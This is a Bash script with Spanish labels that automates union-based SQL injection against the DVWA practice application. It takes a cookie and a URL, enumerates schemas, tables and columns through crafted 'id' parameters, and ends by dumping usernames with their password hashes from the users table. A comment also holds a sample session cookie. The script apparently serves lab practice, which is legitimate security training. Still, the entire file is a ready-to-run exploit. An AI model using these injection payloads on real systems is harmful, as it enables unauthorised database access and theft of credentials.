#!/bin/bash

greenColour="\e[0;32m\033[1m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
endColour="\033[0m\e[0m"

# Cookie: security=low; PHPSESSID=95a357a922ced9e2c0a4f4ee85add313
# http://192.168.0.102
trap ctrl_c INT

function ctrl_c(){
	echo -e "\n[!] Saliendo ...\n"
	exit 1
}

function helpPanel(){
	echo -e "\nUse: ./sql.sh <cookie> <url>\n"
	exit 1
}

if [ $# -ne 2 ]; then
	helpPanel
else
	declare -r token=$1
	declare -r url=$2

	echo -e "${greenColour}\nBASE DE DATOS${endColour}"
	for i in $(seq 0 6); do
		echo -en "[*] DB $i: "
			curl -s -H "$token" -X GET "$url/dvwa/vulnerabilities/sqli/?id=%27+union+select+schema_name%2Cnull+from+information_schema.schemata+limit+$i%2C1--+-&Submit=Submit#" | html2text | grep "First name" | awk '{print $3}';sleep 1
	done

	echo -e "${greenColour}\nTABLAS DE LA DDBB DVWA:${endColour}"
	for i in $(seq 0 1); do echo -en "[*] Tabla $i:"; curl -s -H "$token" -X GET "$url/dvwa/vulnerabilities/sqli/?id=%27+union+select+table_name%2C2+from+information_schema.tables+where+table_schema%3D%22dvwa%22+limit+$i%2C1--+-&Submit=Submit#" | html2text | grep "First" | awk '{print $3}';sleep 1;done

	echo -e "${greenColour}\nCOLUMNAS DE LA TABLA 'guestbook'${endColour}"
	for i in $(seq 0 2); do echo -en "[*] Columna $i: "; curl -s -H "$token" -X GET "$url/dvwa/vulnerabilities/sqli/?id=%27+union+select+column_name%2C+null+from+information_schema.columns+where+table_schema%3D%22dvwa%22+and+table_name%3D%22guestbook%22+limit+$i%2C1--+-&Submit=Submit#" | html2text | grep "First name:" | awk '{print $3}';sleep 1;done

	echo -e "${greenColour}\nCOLUMNAS DE LA TABLA 'users'${endColour}"
	for i in $(seq 0 5); do echo -en "[*] Columna $i: "; curl -s -H "$token" -X GET "$url/dvwa/vulnerabilities/sqli/?id=%27+union+select+column_name%2C+null+from+information_schema.columns+where+table_schema%3D%22dvwa%22+and+table_name%3D%22users%22+limit+$i%2C1--+-&Submit=Submit#" | html2text | grep "First name:" | awk '{print $3}';sleep 1;done

	echo -e "${greenColour}\nUSUARIO Y HASH:${endColour}"
	for i in $(seq 0 4); do echo -en "[*] Usuario $i: "; curl -s -H "$token" -X GET "$url/dvwa/vulnerabilities/sqli/?id=%27+union+select+concat%28user%2C0x3a%2Cpassword%29%2CNULL+FROM+dvwa.users+limit+$i%2C1--+-&Submit=Submit#" | html2text | grep "First name:" | awk '{print $3}';done

fi




